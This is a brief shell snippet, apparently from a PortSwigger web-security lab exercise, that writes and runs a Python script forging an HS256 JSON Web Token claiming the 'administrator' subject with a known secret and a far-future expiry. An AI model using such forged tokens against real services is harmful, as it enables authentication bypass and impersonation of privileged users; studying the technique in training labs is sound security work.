cat << 'EOF' > forge_jwt.py
import jwt

secret = "SECRET_CODE"
payload = {"iss": "portswigger", "sub": "administrator", "exp": 9999999999}
token = jwt.encode(payload, secret, algorithm="HS256")
print(token)
EOF
python forge_jwt.py
